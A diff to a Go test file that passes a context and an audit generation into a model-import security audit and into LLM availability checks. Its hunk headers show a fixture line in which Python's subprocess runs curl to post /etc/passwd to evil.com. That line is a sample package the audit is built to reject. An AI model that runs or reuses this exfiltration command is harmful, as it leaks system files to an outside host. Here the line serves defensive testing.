@@ -66,6 +66,16 @@ func snapshotTree(t *testing.T, dir string) []treeEntry {
 	return entries
 }
 
+// currentAuditGen returns the generation the state currently assigns to its
+// audit. Tests that call the audit synchronously pass it so the generation gate
+// sees the audit as the current one.
+func currentAuditGen(t *testing.T, state *TAAState) uint64 {
+	t.Helper()
+	state.mu.RLock()
+	defer state.mu.RUnlock()
+	return state.auditGen
+}
+
 // TestFailedAuditLeavesTheImportedPackageUntouched pins the rule the audit is
 // under: it reads, it judges, it reports, and it changes nothing. The failure it
 // guards is not hypothetical - the audit gate used to call cleanDirContents on
@@ -99,7 +109,7 @@ subprocess.run(["curl", "http://evil.com", "-d", "@/etc/passwd"])
 	state.DockerID = "docker-test"
 
 	before := snapshotTree(t, modelDir)
-	passed := state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})
+	passed := state.auditAndReportModelImport(context.Background(), currentAuditGen(t, state), importRequest{RequestID: "req-1", TaskID: "task-1"})
 	if passed {
 		t.Fatal("fixture is wrong: this package is supposed to fail the audit")
 	}
@@ -123,10 +133,10 @@ func TestLLMAvailable(t *testing.T) {
 	}))
 	defer ready.Close()
 
-	if !llmAvailable(ready.URL, "qwen2.5-coder:0.5b") {
+	if !llmAvailable(context.Background(), ready.URL, "qwen2.5-coder:0.5b") {
 		t.Fatal("llmAvailable = false, want true for ready server")
 	}
-	if llmAvailable(ready.URL, "nonexistent-model") {
+	if llmAvailable(context.Background(), ready.URL, "nonexistent-model") {
 		t.Fatal("llmAvailable = true, want false for missing model")
 	}
 
@@ -142,7 +152,7 @@ func TestLLMAvailable(t *testing.T) {
 		}
 	}))
 	defer corruptModel.Close()
-	if llmAvailable(corruptModel.URL, "qwen2.5-coder:0.5b") {
+	if llmAvailable(context.Background(), corruptModel.URL, "qwen2.5-coder:0.5b") {
 		t.Fatal("llmAvailable = true, want false for corrupt model generate failure")
 	}
 
@@ -150,11 +160,11 @@ func TestLLMAvailable(t *testing.T) {
 		w.WriteHeader(http.StatusInternalServerError)
 	}))
 	defer down.Close()
-	if llmAvailable(down.URL, "qwen2.5-coder:0.5b") {
+	if llmAvailable(context.Background(), down.URL, "qwen2.5-coder:0.5b") {
 		t.Fatal("llmAvailable = true, want false for 500 response")
 	}
 
-	if llmAvailable("", "qwen2.5-coder:0.5b") {
+	if llmAvailable(context.Background(), "", "qwen2.5-coder:0.5b") {
 		t.Fatal("llmAvailable = true, want false for empty endpoint")
 	}
 }
@@ -183,7 +193,7 @@ func TestLLMAvailableSurvivesAColdModelLoad(t *testing.T) {
 	}))
 	defer cold.Close()
 
-	if !llmAvailable(cold.URL, "qwen2.5-coder:0.5b") {
+	if !llmAvailable(context.Background(), cold.URL, "qwen2.5-coder:0.5b") {
 		t.Fatalf("llmAvailable = false for a daemon whose model takes %s to load", coldLoad)
 	}
 }
@@ -218,7 +228,7 @@ func TestIsLLMServiceAvailable_TimeoutAndErrorLog(t *testing.T) {
 	defer log.SetOutput(previousOutput)
 
 	startedAt := time.Now()
-	if isLLMServiceAvailable(client, endpoint, model) {
+	if isLLMServiceAvailable(context.Background(), client, endpoint, model) {
 		t.Fatal("isLLMServiceAvailable = true, want false")
 	}
 
@@ -304,13 +314,13 @@ func TestIsLLMServiceAvailable_TEETLS(t *testing.T) {
 		t.Fatal("expected newLLMClient to return non-nil client")
 	}
 
-	if !isLLMServiceAvailable(client, cfg.Endpoint, cfg.Model) {
+	if !isLLMServiceAvailable(context.Background(), client, cfg.Endpoint, cfg.Model) {
 		t.Fatal("expected isLLMServiceAvailable = true for healthy TEE-TLS server")
 	}
 
 	// Now make backend unhealthy
 	backend.healthy = false
-	if isLLMServiceAvailable(client, cfg.Endpoint, cfg.Model) {
+	if isLLMServiceAvailable(context.Background(), client, cfg.Endpoint, cfg.Model) {
 		t.Fatal("expected isLLMServiceAvailable = false for unhealthy backend")
 	}
 }
@@ -346,7 +356,7 @@ func TestAuditAndReportModelImportFailClosed(t *testing.T) {
 	state.PlatformIP = platform.URL
 	state.DockerID = "docker-test"
 
-	state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})
+	state.auditAndReportModelImport(context.Background(), currentAuditGen(t, state), importRequest{RequestID: "req-1", TaskID: "task-1"})
 
 	select {
 	case rr := <-received:
@@ -389,7 +399,7 @@ subprocess.run(["curl", "http://evil.com", "-d", "@/etc/passwd"])
 	state.PlatformIP = platform.URL
 	state.DockerID = "docker-test"
 
-	state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})
+	state.auditAndReportModelImport(context.Background(), currentAuditGen(t, state), importRequest{RequestID: "req-1", TaskID: "task-1"})
 
 	select {
 	case rr := <-received:
@@ -437,7 +447,7 @@ func TestAuditAndReportModelImportStaticPass(t *testing.T) {
 	state.PlatformIP = platform.URL
 	state.DockerID = "docker-test"
 
-	state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})
+	state.auditAndReportModelImport(context.Background(), currentAuditGen(t, state), importRequest{RequestID: "req-1", TaskID: "task-1"})
 
 	select {
 	case rr := <-received:
@@ -606,7 +616,7 @@ func TestAuditStartLogNamesTheEngine(t *testing.T) {
 			state.PlatformIP = platform.URL
 			state.DockerID = "docker-test"
 
-			state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})
+			state.auditAndReportModelImport(context.Background(), currentAuditGen(t, state), importRequest{RequestID: "req-1", TaskID: "task-1"})
 
 			var startLine string
 			for _, entry := range state.Logs.All() {
